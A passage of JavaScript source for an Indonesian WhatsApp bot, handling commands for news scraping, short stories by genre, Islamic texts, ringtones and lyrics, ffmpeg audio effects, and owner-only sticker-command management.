teks = "=============="
for (let i of res) {
no += 1
teks += `\n• ${no.toString()} •\n`
teks += `Berita: ${i.berita}\n`
teks += `Upload: ${i.berita_diupload}\n`
teks += `Jenis: ${i.berita_jenis}\n`
teks += `Link: ${i.berita_url}\n`
}
teks += "=============="
Cepti.sendMessage(m.chat, { image : { url : res[0].berita_thumb }, caption: teks }, { quoted : m })
})

break
case 'indozone-news':
  
    if (isBan) return reply(mess.banned)
IndozoneNews().then(async(res) => {
no = 0
teks = "=============="
for (let i of res) {
no += 1
teks += `\n• ${no.toString()} •\n`
teks += `Berita: ${i.berita}\n`
teks += `Upload: ${i.berita_diupload}\n`
teks += `Jenis: ${i.berita_jenis}\n`
teks += `Link: ${i.berita_url}\n`
}
teks += "=============="
Cepti.sendMessage(m.chat, { image : { url : res[0].berita_thumb }, caption: teks }, { quoted : m })
})
break
case 'detik-news':
  
    if (isBan) return reply(mess.banned)
DetikNews().then(async(res) => {

no = 0
teks = "=============="
for (let i of res) {
no += 1
teks += `\n• ${no.toString()} •\n`
teks += `Berita: ${i.berita}\n`
teks += `Upload: ${i.berita_diupload}\n`
teks += `Link: ${i.berita_url}\n`
}
teks += "=============="
Cepti.sendMessage(m.chat, { image : { url : res[0].berita_thumb }, caption: teks }, { quoted : m })

})

break
case 'daily-news':
  
    if (isBan) return reply(mess.banned)
DailyNews().then(async(res) => {

no = 0
teks = "=============="
for (let i of res) {
no += 1
teks += `\n• ${no.toString()} •\n`
teks += `Berita: ${i.berita}\n`
teks += `Link: ${i.berita_url}\n`
}
teks += "=============="
Cepti.sendMessage(m.chat, { image : { url : res[0].berita_thumb }, caption: teks }, { quoted : m })

})

break

case 'inews-news':
  
    if (isBan) return reply(mess.banned)
iNews().then(async(res) => {

no = 0
teks = "=============="
for (let i of res) {
no += 1
teks += `\n• ${no.toString()} •\n`
teks += `Berita: ${i.berita}\n`
teks += `Upload: ${i.berita_diupload}\n`
teks += `Jenis: ${i.berita_jenis}\n`
teks += `Link: ${i.berita_url}\n`
}
teks += "=============="
reply(teks) 
})

break
case 'okezone-news':
  
    if (isBan) return reply(mess.banned)
OkezoneNews().then(async(res) => {

no = 0
teks = "=============="
for (let i of res) {
no += 1
teks += `\n• ${no.toString()} •\n`
teks += `Berita: ${i.berita}\n`
teks += `Upload: ${i.berita_diupload}\n`
teks += `Link: ${i.berita_url}\n`
}
teks += "=============="
Cepti.sendMessage(m.chat, { image : { url : res[0].berita_thumb }, caption: teks }, { quoted : m })

})

break

case 'sindo-news':
  
    if (isBan) return reply(mess.banned)
SindoNews().then(async(res) => {

no = 0
teks = "=============="
for (let i of res) {
no += 1
teks += `\n• ${no.toString()} •\n`
teks += `Berita: ${i.berita}\n`
teks += `Jenis: ${i.berita_jenis}\n`
teks += `Link: ${i.berita_url}\n`
}
teks += "=============="
reply(teks) 
})

break
case 'tempo-news':
  
    if (isBan) return reply(mess.banned)
TempoNews().then(async(res) => {

no = 0
teks = "=============="
for (let i of res) {
no += 1
teks += `\n• ${no.toString()} •\n`
teks += `Berita: ${i.berita}\n`
teks += `Upload: ${i.berita_diupload}\n`
teks += `Link: ${i.berita_url}\n`
}
teks += "=============="
Cepti.sendMessage(m.chat, { image : { url : res[0].berita_thumb }, caption: teks }, { quoted : m })

})

break
case 'antara-news':
  
    if (isBan) return reply(mess.banned)
AntaraNews().then(async(res) => {

no = 0
teks = "=============="
for (let i of res) {
no += 1
teks += `\n• ${no.toString()} •\n`
teks += `Berita: ${i.berita}\n`
teks += `Upload: ${i.berita_diupload}\n`
teks += `Jenis: ${i.berita_jenis}\n`
teks += `Link: ${i.berita_url}\n`
}
teks += "=============="
Cepti.sendMessage(m.chat, { image : { url : res[0].berita_thumb }, caption: teks }, { quoted : m })

})

break

case "kontan-news":
  
    if (isBan) return reply(mess.banned)
  KontanNews().then(async (res) => {
    
    teks = "=============="
    no = 0
    for (let i of res) {
 no += 1
 teks += `\n• ${no.toString()} •\n`
 teks += `Berita: ${i.berita}\n`
 teks += `Jenis: ${i.berita_jenis}\n`
 teks += `Upload: ${i.berita_diupload}\n`
 teks += `Link: ${i.berita_url}\n`
    }
    teks += "=============="
    Cepti.sendMessage(m.chat, { image : { url : res[0].berita_thumb }, caption: teks }, { quoted : m })

  })
  
break
case "merdeka-news":
  
    if (isBan) return reply(mess.banned)
  MerdekaNews().then(async (res) => {
    
    teks = "=============="
    no = 0
    for (let i of res) {
 no += 1
 teks += `\n• ${no.toString()} •\n`
 teks += `Berita: ${i.berita}\n`
 teks += `Upload: ${i.berita_diupload}\n`
 teks += `Link: ${i.berita_url}\n`
    }
    teks += "=============="
    Cepti.sendMessage(m.chat, { image : { url : res[0].berita_thumb }, caption: teks }, { quoted : m })

  })
  
break
case "jalantikus-meme":
  
    if (isBan) return reply(mess.banned)
  var res = await JalanTikusMeme()
teks = "=============="
teks += `\nSource: ${res}\n`
teks += "=============="
Cepti.sendMessage(m.chat, { image : { url : res }, caption: teks }, { quoted : m })
break
break
case 'fajar-news':
  
    if (isBan) return reply(mess.banned)
FajarNews().then(async(res) => {
no = 0
teks = "============="
for (let i of res) {
no += 1
teks += `=============`
teks += `\n• ${no.toString()} •\n`
teks += `Berita: ${i.berita}\n`
teks += `Upload: ${i.berita_diupload}\n`
teks += `Jenis: ${i.berita_jenis}\n`
teks += `Link: ${i.berita_url}\n`
teks += `=============`
}
teks += "============="
reply(teks) 
})
break
//SELESAI//
//━━━━━━━━━━━━━━━[ RANDOM CERPEN ]━━━━━━━━━━━━━━━━━//
case 'cerpen-anak':{
let hasil = await cerpen(`anak`)
m.reply(`
❏ *Judul*: ${hasil.title}
❏ *Author*: ${hasil.author}
❏ *Category*:${hasil.kategori}
❏ *Pass Moderation*:${hasil.lolos}\n
❏ *Story*: ${hasil.cerita}`)
}
break
case 'cerpen-bahasadaerah':{
let hasil = await cerpen(`bahasa daerah`)
m.reply(`
❏ *Judul*: ${hasil.title}
❏ *Author*: ${hasil.author}
❏ *Category*:${hasil.kategori}
❏ *Pass Moderation*:${hasil.lolos}\n
❏ *Story*: ${hasil.cerita}`)
}
break
case 'cerpen-bahasainggris':{
let hasil = await cerpen(`bahasa Inggris`)
m.reply(`
❏ *Judul*: ${hasil.title}
❏ *Author*: ${hasil.author}
❏ *Category*:${hasil.kategori}
❏ *Pass Moderation*:${hasil.lolos}\n
❏ *Story*: ${hasil.cerita}`)
}
break
case 'cerpen-bahasajawa':{
let hasil = await cerpen(`bahasa jawa`)
m.reply(`
❏ *Judul*: ${hasil.title}
❏ *Author*: ${hasil.author}
❏ *Category*:${hasil.kategori}
❏ *Pass Moderation*:${hasil.lolos}\n
❏ *Story*: ${hasil.cerita}`)
}
break
case 'cerpen-bahasasunda':{
let hasil = await cerpen(`bahasa sunda`)
m.reply(`
 ❏ *Judul*: ${hasil.title}
❏ *Author*: ${hasil.author}
❏ *Category*:${hasil.kategori}
❏ *Pass Moderation*:${hasil.lolos}\n
❏ *Story*: ${hasil.cerita}`)
}
break
case 'cerpen-budaya':{
let hasil = await cerpen(`budaya`)
m.reply(`
❏ *Judul*: ${hasil.title}
❏ *Author*: ${hasil.author}
❏ *Category*:${hasil.kategori}
❏ *Pass Moderation*:${hasil.lolos}\n
❏ *Story*: ${hasil.cerita}`)
}
break
case 'cerpen-cinta':{
let hasil = await cerpen(`cinta`)
m.reply(`
❏ *Judul*: ${hasil.title}
❏ *Author*: ${hasil.author}
❏ *Category*:${hasil.kategori}
❏ *Pass Moderation*:${hasil.lolos}\n
❏ *Story*: ${hasil.cerita}`)
}
break
case 'cerpen-cintaislami':{
let hasil = await cerpen(`cinta islami`)
m.reply(`
❏ *Judul*: ${hasil.title}
❏ *Author*: ${hasil.author}
❏ *Category*:${hasil.kategori}
❏ *Pass Moderation*:${hasil.lolos}\n
❏ *Story*: ${hasil.cerita}`)
}
break
case 'cerpen-cintapertama':{
let hasil = await cerpen(`cinta pertama`)
m.reply(`
❏ *Judul*: ${hasil.title}
❏ *Author*: ${hasil.author}
❏ *Category*:${hasil.kategori}
❏ *Pass Moderation*:${hasil.lolos}\n
❏ *Story*: ${hasil.cerita}`)
}
break
case 'cerpen-cintaromantis':{
let hasil = await cerpen(`cinta romantis`)
m.reply(`
❏ *Judul*: ${hasil.title}
❏ *Author*: ${hasil.author}
❏ *Category*:${hasil.kategori}
❏ *Pass Moderation*:${hasil.lolos}\n
❏ *Story*: ${hasil.cerita}`)
}
break
case 'cerpen-cintasedih':{
let hasil = await cerpen(`cinta sedih`)
m.reply(`
❏ *Judul*: ${hasil.title}
❏ *Author*: ${hasil.author}
❏ *Category*:${hasil.kategori}
❏ *Pass Moderation*:${hasil.lolos}\n
❏ *Story*: ${hasil.cerita}`)
}
break
case 'cerpen-cintasegitiga':{
let hasil = await cerpen(`Cinta segitiga`)
m.reply(`
❏ *Judul*: ${hasil.title}
❏ *Author*: ${hasil.author}
❏ *Category*:${hasil.kategori}
❏ *Pass Moderation*:${hasil.lolos}\n
❏ *Story*: ${hasil.cerita}`)
}
break
case 'cerpen-cintasejati':{
let hasil = await cerpen(`cinta sejati`)
m.reply(`
❏ *Judul*: ${hasil.title}
❏ *Author*: ${hasil.author}
❏ *Category*:${hasil.kategori}
❏ *Pass Moderation*:${hasil.lolos}\n
❏ *Story*: ${hasil.cerita}`)
}
break
case 'cerpen-galau':{
let hasil = await cerpen(`galau`)
m.reply(`
❏ *Judul*: ${hasil.title}
❏ *Author*: ${hasil.author}
❏ *Category*:${hasil.kategori}
❏ *Pass Moderation*:${hasil.lolos}\n
❏ *Story*: ${hasil.cerita}`)
}
break
case 'cerpen-gokil':{
let hasil = await cerpen(`gokil`)
m.reply(`
❏ *Judul*: ${hasil.title}
❏ *Author*: ${hasil.author}
❏ *Category*:${hasil.kategori}
❏ *Pass Moderation*:${hasil.lolos}\n
❏ *Story*: ${hasil.cerita}`)
}
break
case 'cerpen-inspiratif':{
let hasil = await cerpen(`inspiratif`)
m.reply(`
❏ *Judul*: ${hasil.title}
❏ *Author*: ${hasil.author}
❏ *Category*:${hasil.kategori}
❏ *Pass Moderation*:${hasil.lolos}\n
❏ *Story*: ${hasil.cerita}`)
}
break
case 'cerpen-jepang':{
let hasil = await cerpen(`jepang`)
m.reply(`
❏ *Judul*: ${hasil.title}
❏ *Author*: ${hasil.author}
❏ *Category*:${hasil.kategori}
❏ *Pass Moderation*:${hasil.lolos}\n
❏ *Story*: ${hasil.cerita}`)
}
break
case 'cerpen-kehidupan':{
let hasil = await cerpen(`kehidupan`)
m.reply(`
❏ *Judul*: ${hasil.title}
❏ *Author*: ${hasil.author}
❏ *Category*:${hasil.kategori}
❏ *Pass Moderation*:${hasil.lolos}\n
❏ *Story*: ${hasil.cerita}`)
}
break
case 'cerpen-keluarga':{
let hasil = await cerpen(`keluarga`)
m.reply(`
❏ *Judul*: ${hasil.title}
❏ *Author*: ${hasil.author}
❏ *Category*:${hasil.kategori}
❏ *Pass Moderation*:${hasil.lolos}\n
❏ *Story*: ${hasil.cerita}`)
}
break
case 'cerpen-kisahnyata':{
let hasil = await cerpen(`kisah nyata`)
m.reply(`
❏ *Judul*: ${hasil.title}
❏ *Author*: ${hasil.author}
❏ *Category*:${hasil.kategori}
❏ *Pass Moderation*:${hasil.lolos}\n
❏ *Story*: ${hasil.cerita}`)
}
break
case 'cerpen-korea':{
let hasil = await cerpen(`korea`)
m.reply(`
❏ *Judul*: ${hasil.title}
❏ *Author*: ${hasil.author}
❏ *Category*:${hasil.kategori}
❏ *Pass Moderation*:${hasil.lolos}\n
❏ *Story*: ${hasil.cerita}`)
}
break
case 'cerpen-kristen':{
let hasil = await cerpen(`kristen`)
m.reply(`
❏ *Judul*: ${hasil.title}
❏ *Author*: ${hasil.author}
❏ *Category*:${hasil.kategori}
❏ *Pass Moderation*:${hasil.lolos}\n
❏ *Story*: ${hasil.cerita}`)
}
break
case 'cerpen-liburan':{
let hasil = await cerpen(`liburan`)
m.reply(`
❏ *Judul*: ${hasil.title}
❏ *Author*: ${hasil.author}
❏ *Category*:${hasil.kategori}
❏ *Pass Moderation*:${hasil.lolos}\n
❏ *Story*: ${hasil.cerita}`)
}
break
case 'cerpen-malaysia':{
let hasil = await cerpen(`malaysia`)
m.reply(`
❏ *Judul*: ${hasil.title}
❏ *Author*: ${hasil.author}
❏ *Category*:${hasil.kategori}
❏ *Pass Moderation*:${hasil.lolos}\n
❏ *Story*: ${hasil.cerita}`)
}
break
case 'cerpen-mengharukan':{
let hasil = await cerpen(`mengharukan`)
m.reply(`
❏ *Judul*: ${hasil.title}
❏ *Author*: ${hasil.author}
❏ *Category*:${hasil.kategori}
❏ *Pass Moderation*:${hasil.lolos}\n
❏ *Story*: ${hasil.cerita}`)
}
break
case 'cerpen-misteri':{
let hasil = await cerpen(`misteri`)
m.reply(`
❏ *Judul*: ${hasil.title}
❏ *Author*: ${hasil.author}
❏ *Category*:${hasil.kategori}
❏ *Pass Moderation*:${hasil.lolos}\n
❏ *Story*: ${hasil.cerita}`)
}
break
case 'cerpen-motivasi':{
let hasil = await cerpen(`motivasi`)
m.reply(`
❏ *Judul*: ${hasil.title}
❏ *Author*: ${hasil.author}
❏ *Category*:${hasil.kategori}
❏ *Pass Moderation*:${hasil.lolos}\n
❏ *Story*: ${hasil.cerita}`)
}
break
case 'cerpen-nasihat':{
let hasil = await cerpen(`nasihat`)
m.reply(`
❏ *Judul*: ${hasil.title}
❏ *Author*: ${hasil.author}
❏ *Category*:${hasil.kategori}
❏ *Pass Moderation*:${hasil.lolos}\n
❏ *Story*: ${hasil.cerita}`)
}
break
case 'cerpen-nasionalisme':{
let hasil = await cerpen(`nasionalisme`)
m.reply(`
❏ *Judul*: ${hasil.title}
❏ *Author*: ${hasil.author}
❏ *Category*:${hasil.kategori}
❏ *Pass Moderation*:${hasil.lolos}\n
❏ *Story*: ${hasil.cerita}`)
}
break
case 'cerpen-olahraga':{
let hasil = await cerpen(`olahraga`)
m.reply(`
❏ *Judul*: ${hasil.title}
❏ *Author*: ${hasil.author}
❏ *Category*:${hasil.kategori}
❏ *Pass Moderation*:${hasil.lolos}\n
❏ *Story*: ${hasil.cerita}`)
}
break
case 'cerpen-patahhati':{
let cerpe = await cerpen(`patah hati`)
reply(`
❏ *Judul*: ${hasil.title}
❏ *Author*: ${hasil.author}
❏ *Category*:${hasil.kategori}
❏ *Pass Moderation*:${hasil.lolos}\n
❏ *Story*: ${hasil.cerita}`)
}
break
case 'cerpen-penantian':{
let hasil = await cerpen(`penantian`)
m.reply(`
❏ *Judul*: ${hasil.title}
❏ *Author*: ${hasil.author}
❏ *Category*:${hasil.kategori}
❏ *Pass Moderation*:${hasil.lolos}\n
❏ *Story*: ${hasil.cerita}`)
}
break
case 'cerpen-pendidikan':{
let hasil = await cerpen(`pendidikan`)
m.reply(`
❏ *Judul*: ${hasil.title}
❏ *Author*: ${hasil.author}
❏ *Category*:${hasil.kategori}
❏ *Pass Moderation*:${hasil.lolos}\n
❏ *Story*: ${hasil.cerita}`)
}
break
case 'cerpen-pengalaman':{
let hasil = await cerpen(`pengalaman pribadi`)
m.reply(`
❏ *Judul*: ${hasil.title}
❏ *Author*: ${hasil.author}
❏ *Category*:${hasil.kategori}
❏ *Pass Moderation*:${hasil.lolos}\n
❏ *Story*: ${hasil.cerita}`)
}
break
case 'cerpen-pengorbanan':{
let hasil = await cerpen(`pengorbanan`)
m.reply(`
❏ *Judul*: ${hasil.title}
❏ *Author*: ${hasil.author}
❏ *Category*:${hasil.kategori}
❏ *Pass Moderation*:${hasil.lolos}\n
❏ *Story*: ${hasil.cerita}`)
}
break
case 'cerpen-penyesalan':{
let hasil = await cerpen(`penyesalan`)
m.reply(`
❏ *Judul*: ${hasil.title}
❏ *Author*: ${hasil.author}
❏ *Category*:${hasil.kategori}
❏ *Pass Moderation*:${hasil.lolos}\n
❏ *Story*: ${hasil.cerita}`)
}
break
case 'cerpen-perjuangan':{
let hasil = await cerpen(`perjuangan`)
m.reply(`
❏ *Judul*: ${hasil.title}
❏ *Author*: ${hasil.author}
❏ *Category*:${hasil.kategori}
❏ *Pass Moderation*:${hasil.lolos}\n
❏ *Story*: ${hasil.cerita}`)
}
break
case 'cerpen-perpisahan':{
let hasil = await cerpen(`perpisahan`)
m.reply(`
❏ *Judul*: ${hasil.title}
❏ *Author*: ${hasil.author}
❏ *Category*:${hasil.kategori}
❏ *Pass Moderation*:${hasil.lolos}\n
❏ *Story*: ${hasil.cerita}`)
}
break
case 'cerpen-persahabatan':{
let hasil = await cerpen(`persahabatan`)
m.reply(`
❏ *Judul*: ${hasil.title}
❏ *Author*: ${hasil.author}
❏ *Category*:${hasil.kategori}
❏ *Pass Moderation*:${hasil.lolos}\n
❏ *Story*: ${hasil.cerita}`)
}
break
case 'cerpen-petualangan':{
let hasil = await cerpen(`petualangan`)
m.reply(`
❏ *Judul*: ${hasil.title}
❏ *Author*: ${hasil.author}
❏ *Category*:${hasil.kategori}
❏ *Pass Moderation*:${hasil.lolos}\n
❏ *Story*: ${hasil.cerita}`)
}
break
case 'cerpen-ramadhan':{
let hasil = await cerpen(`ramadhan`)
m.reply(`
❏ *Judul*: ${hasil.title}
❏ *Author*: ${hasil.author}
❏ *Category*:${hasil.kategori}
❏ *Pass Moderation*:${hasil.lolos}\n
❏ *Story*: ${hasil.cerita}`)
}
break
case 'cerpen-remaja':{
let hasil = await cerpen(`remaja`)
m.reply(`
❏ *Judul*: ${hasil.title}
❏ *Author*: ${hasil.author}
❏ *Category*:${hasil.kategori}
❏ *Pass Moderation*:${hasil.lolos}\n
❏ *Story*: ${hasil.cerita}`)
}
break
case 'cerpen-rindu':{
let hasil = await cerpen(`rindu`)
m.reply(`
❏ *Judul*: ${hasil.title}
❏ *Author*: ${hasil.author}
❏ *Category*:${hasil.kategori}
❏ *Pass Moderation*:${hasil.lolos}\n
❏ *Story*: ${hasil.cerita}`)
}
break
case 'cerpen-rohani':{
let cerpe = await cerpen(`rohani`)
reply(`
❏ *Judul*: ${hasil.title}
❏ *Author*: ${hasil.author}
❏ *Category*:${hasil.kategori}
❏ *Pass Moderation*:${hasil.lolos}\n
❏ *Story*: ${hasil.cerita}`)
}
break
case 'cerpen-romantis':{
let hasil = await cerpen(`romantis`)
m.reply(`
❏ *Judul*: ${hasil.title}
❏ *Author*: ${hasil.author}
❏ *Category*:${hasil.kategori}
❏ *Pass Moderation*:${hasil.lolos}\n
❏ *Story*: ${hasil.cerita}`)
}
break
case 'cerpen-sastra':{
let hasil = await cerpen(`sastra`)
m.reply(`
❏ *Judul*: ${hasil.title}
❏ *Author*: ${hasil.author}
❏ *Category*:${hasil.kategori}
❏ *Pass Moderation*:${hasil.lolos}\n
❏ *Story*: ${hasil.cerita}`)
}
break
case 'cerpen-sedih':{
let hasil = await cerpen(`sedih`)
m.reply(`
❏ *Judul*: ${hasil.title}
❏ *Author*: ${hasil.author}
❏ *Category*:${hasil.kategori}
❏ *Pass Moderation*:${hasil.lolos}\n
❏ *Story*: ${hasil.cerita}`)
}
break
case 'cerpen-sejarah':{
let hasil = await cerpen(`sejarah`)
m.reply(`
❏ *Judul*: ${hasil.title}
❏ *Author*: ${hasil.author}
❏ *Category*:${hasil.kategori}
❏ *Pass Moderation*:${hasil.lolos}\n
❏ *Story*: ${hasil.cerita}`)
}
break
case 'umma': case 'ummadl': {
	   
    if (isBan) return reply(mess.banned)
	if (!text) return reply( `Example : ${prefix + command} https://umma.id/channel/video/post/gus-arafat-sumber-kecewa-84464612933698`)
let anu = await umma(isUrl(text)[0])
if (anu.type == 'video') {
let buttons = [
{buttonId: `ytmp3 ${anu.media[0]} 128kbps`, buttonText: {displayText: '♫ Audio'}, type: 1},
{buttonId: `ytmp4 ${anu.media[0]} 360p`, buttonText: {displayText: '► Video'}, type: 1}
    ]
let buttonMessage = {
image: { url: anu.author.profilePic },
	caption: `
⭔ Title : ${anu.title}
⭔ Author : ${anu.author.name}
⭔ Like : ${anu.like}
⭔ Caption : ${anu.caption}
⭔ Url : ${anu.media[0]}
Untuk Download Media Silahkan Klik salah satu Button dibawah ini atau masukkan command ytmp3/ytmp4 dengan url diatas
`,
	footer: ` © ${setting.botName} bot`,
	buttons,
	headerType: 4
}
Cepti.sendMessage(m.chat, buttonMessage, { quoted: m })
} else if (anu.type == 'image') {
anu.media.map(async (url) => {
Cepti.sendMessage(m.chat, { image: { url }, caption: `⭔ Title : ${anu.title}\n⭔ Author : ${anu.author.name}\n⭔ Like : ${anu.like}\n⭔ Caption : ${anu.caption}` }, { quoted: m })
})
}
}
break
case 'ringtone': {

    if (isBan) return reply(mess.banned)
	if ( checklimitUser(sender) <= 0) return reply(limitabis) 
if (!text) return reply( `Example : ${prefix + command} black rover`)
	reply(mess.wait)
let anu = await ringtone(text)
let result = anu[Math.floor(Math.random() * anu.length)]
Cepti.sendMessage(m.chat, { audio: { url: result.audio }, fileName: result.title+'.mp3', mimetype: 'audio/mpeg' }, { quoted: m })
}
confirmlimit(sender, 1)
break
case 'lirik':

if (isBan) return reply(mess.banned)
if ( checklimitUser(sender) <= 0) return reply(limitabis) 
if (!q) return reply(`Masukan query contoh: \n${prefix}${command} yoru ni kakeru`)
let song = await hx.lirik(q)
Cepti.sendMessage(m.chat, { image : { url : song.thumb }, caption: song.lirik }, { quoted : m })
confirmlimit(sender, 1)
break
case 'iqra': {

    if (isBan) return reply(mess.banned)
	if (checklimitUser(sender) <= 0) return reply(limitabis) 
oh = `Example : ${prefix + command} 3\n\nIQRA Yang tersedia : 1,2,3,4,5,6`
reply(mess.wait)
if (!text) return reply( oh)
yy = await getBuffer(`https://islamic-api-indonesia.herokuapp.com/api/data/pdf/iqra${text}`)
Cepti.sendMessage(m.chat, {document: yy, mimetype: 'application/pdf', fileName: `iqra${text}.pdf`}, {quoted:m}).catch ((err) => reply(oh))
}
confirmlimit(sender, 1)
break
case 'juzamma': {
	
    if (isBan) return reply(mess.banned)
if (checklimitUser(sender) <= 0) return reply(limitabis) 
if (args[0] === 'pdf') {
reply(mess.wait)
Cepti.sendMessage(m.chat, {document: {url: 'https://fatiharridho.my.id/database/islam/juz-amma-arab-latin-indonesia.pdf'}, mimetype: 'application/pdf', fileName: 'juz-amma-arab-latin-indonesia.pdf'}, {quoted:m})
} else if (args[0] === 'docx') {
reply(mess.wait)
Cepti.sendMessage(m.chat, {document: {url: 'https://fatiharridho.my.id/database/islam/juz-amma-arab-latin-indonesia.docx'}, mimetype: 'application/vnd.openxmlformats-officedocument.wordprocessingml.document', fileName: 'juz-amma-arab-latin-indonesia.docx'}, {quoted:m})
} else if (args[0] === 'pptx') {
reply(mess.wait)
Cepti.sendMessage(m.chat, {document: {url: 'https://fatiharridho.my.id/database/islam/juz-amma-arab-latin-indonesia.pptx'}, mimetype: 'application/vnd.openxmlformats-officedocument.presentationml.presentation', fileName: 'juz-amma-arab-latin-indonesia.pptx'}, {quoted:m})
} else if (args[0] === 'xlsx') {
reply(mess.wait)
Cepti.sendMessage(m.chat, {document: {url: 'https://fatiharridho.my.id/database/islam/juz-amma-arab-latin-indonesia.xlsx'}, mimetype: 'application/vnd.openxmlformats-officedocument.spreadsheetml.sheet', fileName: 'juz-amma-arab-latin-indonesia.xlsx'}, {quoted:m})
} else {
reply(`Mau format apa ? Example : ${prefix + command} pdf

Format yang tersedia : pdf, docx, pptx, xlsx`)
}
}
confirmlimit(sender, 1)
break
case 'hadis': case 'hadist': {
	
    if (isBan) return reply(mess.banned)
	if (checklimitUser(sender) <= 0) return reply(limitabis) 
if (!args[0]) return reply( `Contoh:
${prefix + command} bukhari 1
${prefix + command} abu-daud 1

Pilihan tersedia:
abu-daud
1 - 4590
ahmad
1 - 26363
bukhari
1 - 7008
darimi
1 - 3367
ibu-majah
1 - 4331
nasai
1 - 5662
malik
1 - 1594
muslim
1 - 5362`)
if (!args[1]) return reply( `Hadis yang ke berapa?\n\ncontoh:\n${prefix + command} muslim 1`)
try {
let res = await fetchJson(`https://islamic-api-indonesia.herokuapp.com/api/data/json/hadith/${args[0]}`)
let { number, arab, id } = res.find(v => v.number == args[1])
reply(`No. ${number}

${arab}

${id}`)
} catch (e) {
reply(`Hadis tidak ditemukan !`)
}
}
confirmlimit(sender, 1)
break
case 'alquran': {

    if (isBan) return reply(mess.banned)
	  if (checklimitUser(sender) <= 0) return reply(limitabis) 
if (!args[0]) return reply( `Contoh penggunaan:\n${prefix + command} 1 2\n\nmaka hasilnya adalah surah Al-Fatihah ayat 2 beserta audionya, dan ayatnya 1 aja`)
if (!args[1]) return reply( `Contoh penggunaan:\n${prefix + command} 1 2\n\nmaka hasilnya adalah surah Al-Fatihah ayat 2 beserta audionya, dan ayatnya 1 aja`)
let res = await fetchJson(`https://islamic-api-indonesia.herokuapp.com/api/data/quran?surah=${args[0]}&ayat=${args[1]}`)
let txt = `*Arab* : ${res.result.data.text.arab}
*English* : ${res.result.data.translation.en}
*Indonesia* : ${res.result.data.translation.id}

( Q.S ${res.result.data.surah.name.transliteration.id} : ${res.result.data.number.inSurah} )`
reply(txt)
Cepti.sendMessage(m.chat, {audio: { url: res.result.data.audio.primary }, mimetype: 'audio/mpeg'}, { quoted : m })
}
confirmlimit(sender, 1)
break
   case 'bass': case 'blown': case 'deep': case 'earrape': case 'fast': case 'fat': case 'nightcore': case 'reverse': case 'robot': case 'slow': case 'smooth': case 'tupai':
    
    if (isBan) return reply(mess.banned)
 	if (checklimitUser(sender) <= 0) return reply(limitabis) 
try {
let set
if (/bass/.test(command)) set = '-af equalizer=f=54:width_type=o:width=2:g=20'
if (/blown/.test(command)) set = '-af acrusher=.1:1:64:0:log'
if (/deep/.test(command)) set = '-af atempo=4/4,asetrate=44500*2/3'
if (/earrape/.test(command)) set = '-af volume=12'
if (/fast/.test(command)) set = '-filter:a "atempo=1.63,asetrate=44100"'
if (/fat/.test(command)) set = '-filter:a "atempo=1.6,asetrate=22100"'
if (/nightcore/.test(command)) set = '-filter:a atempo=1.06,asetrate=44100*1.25'
if (/reverse/.test(command)) set = '-filter_complex "areverse"'
if (/robot/.test(command)) set = '-filter_complex "afftfilt=real=\'hypot(re,im)*sin(0)\':imag=\'hypot(re,im)*cos(0)\':win_size=512:overlap=0.75"'
if (/slow/.test(command)) set = '-filter:a "atempo=0.7,asetrate=44100"'
if (/smooth/.test(command)) set = '-filter:v "minterpolate=\'mi_mode=mci:mc_mode=aobmc:vsbmc=1:fps=120\'"'
if (/tupai/.test(command)) set = '-filter:a "atempo=0.5,asetrate=65100"'
if (/audio/.test(mime)) {
reply(mess.wait)
let media = await Cepti.downloadAndSaveMediaMessage(quoted)
let ran = getRandom('.mp3')
exec(`ffmpeg -i ${media} ${set} ${ran}`, (err, stderr, stdout) => {
fs.unlinkSync(media)
if (err) return reply(err)
let buff = fs.readFileSync(ran)
Cepti.sendMessage(m.chat, { audio: buff, mimetype: 'audio/mpeg' }, { quoted : m })
fs.unlinkSync(ran)
})
} else reply(`Balas audio yang ingin diubah dengan caption *${prefix + command}*`)
confirmlimit(sender, 1)
} catch (e) {
reply(e)
}
break
case 'setcmd': {
if (!m.quoted) return reply( 'Reply Pesan!')
if (!m.quoted.fileSha256) return reply( 'SHA256 Hash Missing')
if (!isOwner) return reply(mess.owner)
if (!text) return reply( `Untuk Command Apa?`)
let hash = m.quoted.fileSha256.toString('base64')
if (global.db.sticker[hash] && global.db.sticker[hash].locked) return reply( 'You have no permission to change this sticker command')
global.db.sticker[hash] = {
    text,
    mentionedJid: m.mentionedJid,
    creator: m.sender,
    at: + new Date,
    locked: false,
}
reply(`Done!`)
}
break
case 'delcmd': {
let hash = m.quoted.fileSha256.toString('base64')
if (!hash) return reply( `Tidak ada hash`)
if (!isOwner) return reply(mess.owner)
if (global.db.sticker[hash] && global.db.sticker[hash].locked) return reply( 'You have no permission to delete this sticker command')
delete global.db.sticker[hash]
reply(`Done!`)
}
break
case 'listcmd': {
  if (!isOwner) return reply(mess.owner)
let teks = `
*List Hash*
Info: *bold* hash is Locked
${Object.entries(global.db.sticker).map(([key, value], index) => `${index + 1}. ${value.locked ? `*${key}*` : key} : ${value.text}`).join('\n')}
`.trim()
Cepti.sendText(m.chat, teks, m, { mentions: Object.values(global.db.sticker).map(x => x.mentionedJid).reduce((a,b) => [...a, ...b], []) })
}
break
case 'lockcmd': {
  if (!isOwner) return reply(mess.owner)
if (!isOwner) return reply(mess.owner)
if (!m.quoted) return reply( 'Reply Pesan!')
if (!m.quoted.fileSha256) return reply( 'SHA256 Hash Missing')
let hash = m.quoted.fileSha256.toString('base64')
if (!(hash in global.db.sticker)) return reply( 'Hash not found in database')
global.db.sticker[hash].locked = !/^un/i.test(command)
reply('Done!')
}
break
case 'addmsg': {
 
    if (isBan) return reply(mess.banned)
if (!m.quoted) return reply( 'Reply Message Yang Ingin Disave Di Database')
if (!text) return reply( `Example : ${prefix + command} nama file`)
let msgs = global.db.database
if (text.toLowerCase() in msgs) return reply( `'${text}' telah terdaftar di list pesan`)
msgs[text.toLowerCase()] = quoted.fakeObj
reply(`Berhasil menambahkan pesan di list pesan sebagai '${text}'
    
Akses dengan ${prefix}getmsg ${text}

Lihat list Pesan Dengan ${prefix}listmsg`)
}
break
case 'getmsg': {
  
    if (isBan) return reply(mess.banned)
if (!text) return reply( `Example : ${prefix + command} file name\n\nLihat list pesan dengan ${prefix}listmsg`)
let msgs = global.db.database
if (!(text.toLowerCase() in msgs)) return reply( `'${text}' tidak terdaftar di list pesan`)
Cepti.copyNForward(m.chat, msgs[text.toLowerCase()], true)
}
break
case 'listmsg': {
  
    if (isBan) return reply(mess.banned)
let msgs = JSON.parse(fs.readFileSync('./src/database.json'))
	let seplit = Object.entries(global.db.database).map(([nama, isi]) => { return { nama, ...isi } })
